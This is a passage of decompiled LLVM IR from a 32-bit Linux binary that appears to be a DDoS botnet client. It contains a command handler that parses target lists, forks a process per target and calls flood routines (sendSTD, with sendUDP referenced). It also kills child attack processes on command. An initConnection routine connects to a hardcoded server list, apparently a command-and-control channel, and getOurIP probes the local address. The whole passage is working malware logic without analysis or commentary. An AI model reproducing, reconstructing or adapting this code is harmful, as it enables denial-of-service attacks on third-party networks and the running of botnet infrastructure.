dec_label_pc_804c695.dec_label_pc_804c6cb_crit_edge: ; preds = %dec_label_pc_804c695
  %v0_804c6d0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c6cb

dec_label_pc_804c69b:                             ; preds = %dec_label_pc_804c695
  %v1_804c69e = add i32 %tmp134, 8
  %v1_804c6a1 = inttoptr i32 %v1_804c69e to i32*
  %v2_804c6a1 = load i32, i32* %v1_804c6a1, align 4
  %v0_804c6a3 = load i32, i32* @esp, align 4
  %v5_804c6a3 = icmp ult i32 %v0_804c6a3, 12
  store i1 %v5_804c6a3, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6a1, i32* %stack_var_-300, align 4
  %v1_804c6a7 = call i32 @atol(i32 %v2_804c6a1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp160 = icmp slt i32 %v1_804c6a7, 1
  br i1 %tmp160, label %dec_label_pc_804c6cb, label %dec_label_pc_804c6b3

dec_label_pc_804c6b3:                             ; preds = %dec_label_pc_804c69b
  %v1_804c6b6 = add i32 %tmp134, 12
  %v1_804c6b9 = inttoptr i32 %v1_804c6b6 to i32*
  %v2_804c6b9 = load i32, i32* %v1_804c6b9, align 4
  %v5_804c6bb = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c6bb, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6b9, i32* %stack_var_-300, align 4
  %v1_804c6bf = call i32 @atol(i32 %v2_804c6b9)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp161 = icmp slt i32 %v1_804c6bf, 1
  %tmp162 = icmp eq i1 %tmp161, false
  br i1 %tmp162, label %dec_label_pc_804c6e6, label %dec_label_pc_804c6cb

dec_label_pc_804c6cb:                             ; preds = %dec_label_pc_804c695.dec_label_pc_804c6cb_crit_edge, %dec_label_pc_804c6b3, %dec_label_pc_804c69b
  %v0_804c6d0 = phi i32 [ %v0_804c6d0.pre, %dec_label_pc_804c695.dec_label_pc_804c6cb_crit_edge ], [ %v15_804bd62, %dec_label_pc_804c6b3 ], [ %v15_804bd62, %dec_label_pc_804c69b ]
  %v0_804c6cb = load i32, i32* @global_var_805a160.18, align 32
  %v5_804c6d0 = icmp ult i32 %v0_804c6d0, 8
  store i1 %v5_804c6d0, i1* %cf.global-to-local, align 1
  store i32 %v0_804c6cb, i32* %stack_var_-300, align 4
  %v2_804c6d9 = call i32 @Rootsprintf(i32 %v0_804c6cb, i32 ptrtoint ([27 x i8]* @global_var_8056662.163 to i32))
  %v0_804c6de = load i32, i32* @esp, align 4
  %v2_804c6de = icmp ugt i32 %v0_804c6de, -17
  store i1 %v2_804c6de, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c8cb

dec_label_pc_804c6e6:                             ; preds = %dec_label_pc_804c6b3
  %v1_804c6e9 = add i32 %tmp134, 4
  %v1_804c6ec = inttoptr i32 %v1_804c6e9 to i32*
  %v2_804c6ec = load i32, i32* %v1_804c6ec, align 4
  %v2_804c6f7 = load i32, i32* %v1_804c6a1, align 4
  store i1 %v5_804c6bb, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6f7, i32* %stack_var_-300, align 4
  %v1_804c6fd = call i32 @atol(i32 %v2_804c6f7)
  %v2_804c70e = load i32, i32* %v1_804c6b9, align 4
  store i1 %v5_804c6bb, i1* %cf.global-to-local, align 1
  store i32 %v2_804c70e, i32* %stack_var_-300, align 4
  %v1_804c714 = call i32 @atol(i32 %v2_804c70e)
  %v5_804c722 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c722, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6ec, i32* %stack_var_-300, align 4
  %v2_804c728 = inttoptr i32 %v2_804c6ec to i8*
  %v3_804c728 = call i32 @__GI_strchr(i8* %v2_804c728, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c730 = icmp eq i32 %v3_804c728, 0
  br i1 %v1_804c730, label %dec_label_pc_804c791, label %dec_label_pc_804c734

dec_label_pc_804c734:                             ; preds = %dec_label_pc_804c6e6
  store i32 %v2_804c6ec, i32* @eax, align 4
  store i1 %v5_804c722, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6ec, i32* %stack_var_-300, align 4
  %v2_804c740 = call i32 @__GI_strtok(i32 %v2_804c6ec, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c789180 = icmp eq i32 %v2_804c740, 0
  %v1_804c78d181 = icmp eq i1 %v4_804c789180, false
  br i1 %v1_804c78d181, label %dec_label_pc_804c74d, label %dec_label_pc_804c7bc

dec_label_pc_804c74d:                             ; preds = %dec_label_pc_804c734, %dec_label_pc_804c774
  %storemerge71182 = phi i32 [ %v2_804c77e, %dec_label_pc_804c774 ], [ %v2_804c740, %dec_label_pc_804c734 ]
  %v0_804c74d = call i32 @listFork()
  store i32 %v0_804c74d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c752 = icmp eq i32 %v0_804c74d, 0
  %v1_804c754 = icmp eq i1 %v1_804c752, false
  %v0_804c774 = load i32, i32* @esp, align 4
  br i1 %v1_804c754, label %dec_label_pc_804c774, label %dec_label_pc_804c756

dec_label_pc_804c756:                             ; preds = %dec_label_pc_804c74d
  %v5_804c756 = icmp ult i32 %v0_804c774, 4
  store i1 %v5_804c756, i1* %cf.global-to-local, align 1
  store i32 %storemerge71182, i32* %stack_var_-300, align 4
  %v3_804c762 = trunc i32 %v1_804c6fd to i16
  %v4_804c762 = call i32 @sendSTD(i32 %storemerge71182, i16 %v3_804c762, i32 %v1_804c714)
  store i1 %v5_804c6bb, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c76f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c774:                             ; preds = %dec_label_pc_804c74d
  %v5_804c774 = icmp ult i32 %v0_804c774, 8
  store i1 %v5_804c774, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v2_804c77e = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564b1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c789 = icmp eq i32 %v2_804c77e, 0
  %v1_804c78d = icmp eq i1 %v4_804c789, false
  br i1 %v1_804c78d, label %dec_label_pc_804c74d, label %dec_label_pc_804c7bc

dec_label_pc_804c791:                             ; preds = %dec_label_pc_804c6e6
  %v0_804c791 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c796 = icmp eq i32 %v0_804c791, 0
  %v1_804c798 = icmp eq i1 %v1_804c796, false
  br i1 %v1_804c798, label %dec_label_pc_804c8cb, label %dec_label_pc_804c79e

dec_label_pc_804c79e:                             ; preds = %dec_label_pc_804c791
  %v0_804c79e = load i32, i32* @esp, align 4
  %v5_804c79e = icmp ult i32 %v0_804c79e, 4
  store i1 %v5_804c79e, i1* %cf.global-to-local, align 1
  store i32 %v2_804c6ec, i32* %stack_var_-300, align 4
  %v3_804c7aa = trunc i32 %v1_804c6fd to i16
  %v4_804c7aa = call i32 @sendSTD(i32 %v2_804c6ec, i16 %v3_804c7aa, i32 %v1_804c714)
  store i1 %v5_804c6bb, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-300, align 4
  %v1_804c7b7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c7bc:                             ; preds = %dec_label_pc_804c734, %dec_label_pc_804c774, %dec_label_pc_804c64a
  %v2_804c7bf = load i32, i32* %v1_804bd6b, align 4
  store i1 false, i1* @df, align 1
  %v4_804c7dc = inttoptr i32 %v2_804c7bf to i8*
  %v7_804c7ee = call i32 @_strncmp(i8* %v4_804c7dc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805667d.164, i32 0, i32 0), i32 5)
  %v8_804c7ee = urem i32 %v7_804c7ee, 2
  %v9_804c7ee = icmp eq i32 %v8_804c7ee, 0
  %v0_804c7f0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c7f0 = or i1 %v0_804c7f0, %v9_804c7ee
  %v3_804c7f0 = zext i1 %v2_804c7f0 to i32
  %v4_804c7f0 = load i32, i32* @edx, align 4
  %v5_804c7f0 = and i32 %v4_804c7f0, -256
  %v6_804c7f0 = or i32 %v3_804c7f0, %v5_804c7f0
  %v7_804c7f0 = xor i32 %v6_804c7f0, 1
  store i32 %v7_804c7f0, i32* %edx.global-to-local, align 4
  %v1_804c7f8 = trunc i32 %v7_804c7f0 to i8
  %v3_804c7f8 = zext i1 %v0_804c7f0 to i8
  %v4_804c7f8 = sub nsw i8 %v1_804c7f8, %v3_804c7f8
  %v15_804c7f8 = icmp eq i8 %v4_804c7f8, 0
  %v2_804c7fc = sext i8 %v4_804c7f8 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c801 = icmp eq i1 %v15_804c7f8, false
  br i1 %v1_804c801, label %dec_label_pc_804c8cb, label %dec_label_pc_804c86e.preheader

dec_label_pc_804c86e.preheader:                   ; preds = %dec_label_pc_804c7bc
  br label %dec_label_pc_804c86e

dec_label_pc_804c817:                             ; preds = %dec_label_pc_804c8ab, %dec_label_pc_804c86e
  %v2_804c81a = mul i32 %storemerge19, 4
  store i32 %v2_804c81a, i32* %edx.global-to-local, align 4
  %v0_804c81f = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804c824 = add i32 %v0_804c81f, %v2_804c81a
  %v1_804c827 = inttoptr i32 %v2_804c824 to i32*
  %v2_804c827 = load i32, i32* %v1_804c827, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c829 = icmp eq i32 %v2_804c827, 0
  br i1 %v1_804c829, label %dec_label_pc_804c86b, label %dec_label_pc_804c82d

dec_label_pc_804c82d:                             ; preds = %dec_label_pc_804c817
  %v9_804c81a = and i32 %storemerge19, 1073741824
  %v10_804c81a = icmp ne i32 %v9_804c81a, 0
  store i1 %v10_804c81a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c81a, i32* %edx.global-to-local, align 4
  %v2_804c83d = load i32, i32* %v1_804c827, align 4
  store i32 %v2_804c83d, i32* @ebx, align 4
  %v0_804c83f = call i32 @__libc_getpid()
  %v0_804c844 = load i32, i32* @ebx, align 4
  %v7_804c844 = icmp ult i32 %v0_804c844, %v0_804c83f
  store i1 %v7_804c844, i1* %cf.global-to-local, align 1
  %v12_804c844 = icmp eq i32 %v0_804c844, %v0_804c83f
  br i1 %v12_804c844, label %dec_label_pc_804c86b, label %dec_label_pc_804c848

dec_label_pc_804c848:                             ; preds = %dec_label_pc_804c82d
  store i32 %v2_804c81a, i32* %edx.global-to-local, align 4
  %v0_804c850 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804c855 = add i32 %v0_804c850, %v2_804c81a
  %v1_804c858 = inttoptr i32 %v2_804c855 to i32*
  %v2_804c858 = load i32, i32* %v1_804c858, align 4
  %v0_804c85a = load i32, i32* @esp, align 4
  %v5_804c85a = icmp ult i32 %v0_804c85a, 8
  store i1 %v5_804c85a, i1* %cf.global-to-local, align 1
  store i32 %v2_804c858, i32* %stack_var_-300, align 4
  %v2_804c860 = call i32 @kill(i32 %v2_804c858, i32 9)
  %v0_804c865 = load i32, i32* @esp, align 4
  %v2_804c865 = icmp ugt i32 %v0_804c865, -17
  store i1 %v2_804c865, i1* %cf.global-to-local, align 1
  %v4_804c868 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804c86b

dec_label_pc_804c86b:                             ; preds = %dec_label_pc_804c82d, %dec_label_pc_804c817, %dec_label_pc_804c848
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804c817 ], [ %stack_var_-28.1, %dec_label_pc_804c82d ], [ %v4_804c868, %dec_label_pc_804c848 ]
  %v4_804c86b = add i32 %storemerge19, 1
  br label %dec_label_pc_804c86e

dec_label_pc_804c86e:                             ; preds = %dec_label_pc_804c86e.preheader, %dec_label_pc_804c86b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804c86b ], [ 0, %dec_label_pc_804c86e.preheader ]
  %storemerge19 = phi i32 [ %v4_804c86b, %dec_label_pc_804c86b ], [ 0, %dec_label_pc_804c86e.preheader ]
  %v0_804c882 = load i32, i32* @global_var_805a168.32, align 8
  %v0_804c887 = load i32, i32* @global_var_805a16c.33, align 4
  store i32 %v0_804c887, i32* %edx.global-to-local, align 4
  %v10_804c89f = icmp ne i32 %v0_804c887, 0
  store i1 %v10_804c89f, i1* %cf.global-to-local, align 1
  br i1 %v10_804c89f, label %dec_label_pc_804c817, label %dec_label_pc_804c8ab

dec_label_pc_804c8ab:                             ; preds = %dec_label_pc_804c86e
  %v10_804c8bf = icmp ult i32 %storemerge19, %v0_804c882
  store i1 %v10_804c8bf, i1* %cf.global-to-local, align 1
  br i1 %v10_804c8bf, label %dec_label_pc_804c817, label %dec_label_pc_804c8cb

dec_label_pc_804c8cb:                             ; preds = %dec_label_pc_804c31d, %dec_label_pc_804c369, %dec_label_pc_804c8ab, %dec_label_pc_804bfb5, %dec_label_pc_804bf8f, %dec_label_pc_804c389, %dec_label_pc_804bfd2, %dec_label_pc_804bf99, %dec_label_pc_804bee9, %dec_label_pc_804be5f, %dec_label_pc_804c7bc, %dec_label_pc_804c791, %dec_label_pc_804c4b9, %dec_label_pc_804c1e7, %dec_label_pc_804bf12, %dec_label_pc_804bdaf, %dec_label_pc_804c6cb
  %v0_804c8d2 = phi i32 [ %v1_804bfc1, %dec_label_pc_804bfb5 ], [ %v2_804bf84, %dec_label_pc_804bf8f ], [ %v0_804c389, %dec_label_pc_804c389 ], [ %v0_804bfd2, %dec_label_pc_804bfd2 ], [ %v1_804bfa5, %dec_label_pc_804bf99 ], [ %v0_804bee9, %dec_label_pc_804bee9 ], [ 0, %dec_label_pc_804be5f ], [ %v2_804c7fc, %dec_label_pc_804c7bc ], [ %v0_804c791, %dec_label_pc_804c791 ], [ %v2_804c4c7, %dec_label_pc_804c4b9 ], [ %v2_804c1f5, %dec_label_pc_804c1e7 ], [ %v1_804bef6, %dec_label_pc_804bf12 ], [ %v2_804bdbd, %dec_label_pc_804bdaf ], [ %v2_804c6d9, %dec_label_pc_804c6cb ], [ %v0_804c882, %dec_label_pc_804c8ab ], [ %v2_804c329, %dec_label_pc_804c31d ], [ %v2_804c373, %dec_label_pc_804c369 ]
  %v2_804c8ce = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c8ce, i32* @ebx, align 4
  store i32 %v0_804bd60, i32* @esi, align 4
  store i32 %v0_804bd5f, i32* @edi, align 4
  ret i32 %v0_804c8d2

; uselistorder directives
  uselistorder i32 %storemerge19, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804c858, { 1, 0 }
  uselistorder i32 %v2_804c81a, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804c7f0, { 1, 0 }
  uselistorder i32 %v2_804c77e, { 1, 0 }
  uselistorder i32 %v0_804c774, { 1, 0 }
  uselistorder i32 %v2_804c70e, { 1, 0 }
  uselistorder i32 %v2_804c6f7, { 1, 0 }
  uselistorder i32 %v2_804c6ec, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804c6cb, { 1, 0 }
  uselistorder i1 %v5_804c6bb, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_804c6b9, { 1, 0 }
  uselistorder i32 %v2_804c6a1, { 1, 0 }
  uselistorder i1 %v0_804c67e, { 1, 0 }
  uselistorder i32 %v2_804c604, { 1, 0 }
  uselistorder i32 %v0_804c5fa, { 1, 0 }
  uselistorder i1 %v5_804c59c, { 1, 0 }
  uselistorder i32 %v2_804c570, { 1, 0 }
  uselistorder i32 %v2_804c53b, { 1, 0 }
  uselistorder i32 %v2_804c52a, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c513, { 1, 0 }
  uselistorder i32 %v2_804c4fc, { 1, 0 }
  uselistorder i32 %v2_804c4e5, { 1, 0 }
  uselistorder i32 %v2_804c4da, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804c4b9, { 1, 0 }
  uselistorder i32 %v2_804c4a7, { 1, 0 }
  uselistorder i32 %v2_804c489, { 1, 0 }
  uselistorder i32 %v1_804c478, { 1, 0 }
  uselistorder i32 %v1_804c470, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c46a, { 1, 0 }
  uselistorder i32 %v2_804c451, { 1, 0 }
  uselistorder i1 %v5_804c43a, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i32 %v2_804c438, { 1, 0 }
  uselistorder i32 %v2_804c41b, { 1, 0 }
  uselistorder i1 %v0_804c3f4, { 1, 0 }
  uselistorder i32 %v2_804c373, { 0, 2, 1 }
  uselistorder i1 %v5_804c30b, { 1, 0 }
  uselistorder i32 %v2_804c2df, { 1, 0 }
  uselistorder i32 %v1_804c2b0, { 2, 1, 0 }
  uselistorder i32 %v2_804c2aa, { 1, 0 }
  uselistorder i32 %v1_804c27b, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c275, { 1, 0 }
  uselistorder i32 %v1_804c25e, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c258, { 1, 0 }
  uselistorder i32 %v2_804c241, { 1, 0 }
  uselistorder i32 %v2_804c22a, { 1, 0 }
  uselistorder i32 %v2_804c213, { 1, 0 }
  uselistorder i32 %v2_804c208, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804c1e7, { 1, 0 }
  uselistorder i32 %v2_804c1d5, { 1, 0 }
  uselistorder i1 %v8_804c1c9, { 1, 0, 2 }
  uselistorder i32 %v1_804c1c4, { 1, 0 }
  uselistorder i32 %v1_804c1bc, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c1b6, { 1, 0 }
  uselistorder i32 %v1_804c1a9, { 1, 0 }
  uselistorder i32 %v1_804c1a1, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c19b, { 1, 0 }
  uselistorder i32 %v1_804c18e, { 1, 0 }
  uselistorder i32 %v1_804c186, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804c180, { 1, 0 }
  uselistorder i32 %v2_804c167, { 1, 0 }
  uselistorder i32 %v2_804c14a, { 1, 0 }
  uselistorder i1 %v5_804c12f, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804c12d, { 1, 0 }
  uselistorder i32 %v2_804c110, { 1, 0 }
  uselistorder i1 %v0_804c0e9, { 1, 0 }
  uselistorder i1 %v5_804c021, { 1, 0 }
  uselistorder i1 %v5_804bfbd, { 0, 5, 4, 3, 2, 1 }
  uselistorder i1 %v0_804bf78, { 1, 0 }
  uselistorder i1 %v0_804bed6, { 1, 0 }
  uselistorder i32 %v0_804be7f, { 1, 0 }
  uselistorder i32 %v0_804be5f, { 1, 0, 2 }
  uselistorder i1 %v0_804be4c, { 1, 0 }
  uselistorder i1 %v0_804bdfe, { 1, 0 }
  uselistorder i32 %v0_804bdaf, { 1, 0 }
  uselistorder i1 %v0_804bd9c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-284, { 5, 0, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i32* %stack_var_-300, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0, 1, 57, 58, 59, 60, 61 }
  uselistorder i32 %tmp134, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %tmp115, { 2, 14, 0, 13, 3, 4, 12, 5, 6, 1, 11, 7, 10, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 13, 10, 11, 12, 14, 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i1* %cf.global-to-local, { 113, 119, 114, 115, 116, 117, 118, 120, 143, 121, 122, 123, 128, 124, 125, 126, 127, 133, 129, 130, 131, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 147, 145, 146, 148, 2, 149, 150, 151, 152, 112, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 73, 33, 34, 38, 35, 36, 37, 132, 39, 40, 41, 42, 43, 44, 45, 111, 46, 47, 0, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 103, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 104, 107, 105, 106, 108, 109, 110 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80564b1.143 to i32), { 4, 0, 3, 1, 5, 2, 6, 7 }
  uselistorder label %dec_label_pc_804c8cb, { 2, 10, 11, 16, 12, 5, 1, 0, 13, 6, 3, 7, 4, 14, 8, 9, 15 }
  uselistorder label %dec_label_pc_804c86e, { 1, 0 }
  uselistorder label %dec_label_pc_804c86b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c7bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c74d, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c64a, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804c5c7, { 1, 0 }
  uselistorder label %dec_label_pc_804c590, { 1, 0 }
  uselistorder label %dec_label_pc_804c55b, { 1, 0 }
  uselistorder label %dec_label_pc_804c4d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c4b9, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804c336, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ff, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c1e7, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c0b5, { 1, 0 }
  uselistorder label %dec_label_pc_804be9f, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804c8dc = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804c8f0 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804c8f0 = call i32 @__GI_memset(i8* %v3_804c8f0, i32 0, i32 4096)
  %v0_804c8f8 = load i32, i32* @global_var_805a160.18, align 32
  %v1_804c8fd = icmp eq i32 %v0_804c8f8, 0
  br i1 %v1_804c8fd, label %dec_label_pc_804c91c, label %dec_label_pc_804c901

dec_label_pc_804c901:                             ; preds = %entry
  %v1_804c90a = call i32 @__libc_close(i32 %v0_804c8f8)
  store i32 0, i32* @global_var_805a160.18, align 32
  br label %dec_label_pc_804c91c

dec_label_pc_804c91c:                             ; preds = %entry, %dec_label_pc_804c901
  %v0_804c91c = load i32, i32* @global_var_8059df8.165, align 8
  %v1_804c921 = icmp eq i32 %v0_804c91c, 0
  %v1_804c923 = icmp eq i1 %v1_804c921, false
  br i1 %v1_804c923, label %dec_label_pc_804c931, label %dec_label_pc_804c93c

dec_label_pc_804c931:                             ; preds = %dec_label_pc_804c91c
  %v1_804c936 = add i32 %v0_804c91c, 1
  br label %dec_label_pc_804c93c

dec_label_pc_804c93c:                             ; preds = %dec_label_pc_804c91c, %dec_label_pc_804c931
  %storemerge = phi i32 [ %v1_804c936, %dec_label_pc_804c931 ], [ 0, %dec_label_pc_804c91c ]
  store i32 %storemerge, i32* @global_var_8059df8.165, align 8
  %v1_804c941 = mul i32 %storemerge, 4
  %v2_804c941 = add i32 %v1_804c941, ptrtoint ([20 x i8]** @global_var_80591d0.166 to i32)
  %v3_804c941 = inttoptr i32 %v2_804c941 to i32*
  %v4_804c941 = load i32, i32* %v3_804c941, align 4
  store i32 %v4_804c941, i32* @eax, align 4
  %v3_804c953 = call i32 @strcpy(i8* %v3_804c8f0, i32 %v4_804c941)
  %v3_804c96e = call i32 @__GI_strchr(i8* %v3_804c8f0, i32 58)
  %v1_804c976 = icmp eq i32 %v3_804c96e, 0
  br i1 %v1_804c976, label %dec_label_pc_804c9b5, label %dec_label_pc_804c97a

dec_label_pc_804c97a:                             ; preds = %dec_label_pc_804c93c
  %v3_804c986 = call i32 @__GI_strchr(i8* %v3_804c8f0, i32 58)
  %v1_804c98e = add i32 %v3_804c986, 1
  %v1_804c993 = call i32 @atol(i32 %v1_804c98e)
  %v3_804c9aa = call i32 @__GI_strchr(i8* %v3_804c8f0, i32 58)
  %v4_804c9aa = inttoptr i32 %v3_804c9aa to i8*
  store i8 0, i8* %v4_804c9aa, align 1
  br label %dec_label_pc_804c9b5

dec_label_pc_804c9b5:                             ; preds = %dec_label_pc_804c93c, %dec_label_pc_804c97a
  %stack_var_-8.0 = phi i32 [ 123, %dec_label_pc_804c93c ], [ %v1_804c993, %dec_label_pc_804c97a ]
  %v3_804c9be = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804c9be, i32* @global_var_805a160.18, align 32
  %v4_804c9de = call i32 @connectTimeout(i32 %v3_804c9be, i32 %v2_804c8dc, i32 %stack_var_-8.0, i32 30)
  %v1_804c9e6 = icmp eq i32 %v4_804c9de, 0
  %. = zext i1 %v1_804c9e6 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 37, 3, 2, 1, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c9b5, { 1, 0 }
  uselistorder label %dec_label_pc_804c93c, { 1, 0 }
  uselistorder label %dec_label_pc_804c91c, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804ca1a = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804ca25 = icmp eq i32 %v5_804ca1a, -1
  %v1_804ca29 = icmp eq i1 %v13_804ca25, false
  br i1 %v1_804ca29, label %dec_label_pc_804ca3a, label %dec_label_pc_804cbfd

dec_label_pc_804ca3a:                             ; preds = %entry
  %v2_804ca3a = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804ca66 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8056682.167 to i32))
  %v2_804ca76 = call i32 @htons(i32 53)
  %v5_804ca8e = call i32 @__libc_connect(i32 %v5_804ca1a, i32 %v2_804ca3a, i32 16)
  %v13_804ca99 = icmp eq i32 %v5_804ca8e, -1
  %v1_804ca9d = icmp eq i1 %v13_804ca99, false
  br i1 %v1_804ca9d, label %dec_label_pc_804caae, label %dec_label_pc_804cbfd

dec_label_pc_804caae:                             ; preds = %dec_label_pc_804ca3a
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804cab5 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804cabb = ptrtoint i32* %stack_var_-60 to i32
  %v5_804cac3 = call i32 @__GI_getsockname(i32 %v5_804ca1a, i32 %v2_804cab5, i32 %v2_804cabb)
  %v13_804cace = icmp eq i32 %v5_804cac3, -1
  %v1_804cad2 = icmp eq i1 %v13_804cace, false
  br i1 %v1_804cad2, label %dec_label_pc_804cae3, label %dec_label_pc_804cbfd

dec_label_pc_804cae3:                             ; preds = %dec_label_pc_804caae
  %v5_804caf5 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805668a.168, i32 0, i32 0), i32 0)
  %v2_804cb58 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804cb6a51 = call i32 @fdgets(i32 %v2_804cb58, i32 4096, i32 %v5_804caf5)
  %v1_804cb7252 = icmp eq i32 %v5_804cb6a51, 0
  %v1_804cb7453 = icmp eq i1 %v1_804cb7252, false
  br i1 %v1_804cb7453, label %dec_label_pc_804cb02, label %dec_label_pc_804cb76

dec_label_pc_804cb02:                             ; preds = %dec_label_pc_804cae3, %dec_label_pc_804cb3c
  %v5_804cb11 = call i32 @strstr(i32 %v2_804cb58, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805669a.169, i32 0, i32 0))
  %v1_804cb19 = icmp eq i32 %v5_804cb11, 0
  br i1 %v1_804cb19, label %dec_label_pc_804cb3c, label %dec_label_pc_804cb2b.preheader

dec_label_pc_804cb2b.preheader:                   ; preds = %dec_label_pc_804cb02
  %v2_804cb2e42 = load i8, i8* %stack_var_-4156, align 1
  %v10_804cb3047 = icmp eq i8 %v2_804cb2e42, 9
  %v1_804cb3248 = icmp eq i1 %v10_804cb3047, false
  br i1 %v1_804cb3248, label %dec_label_pc_804cb28, label %dec_label_pc_804cb34

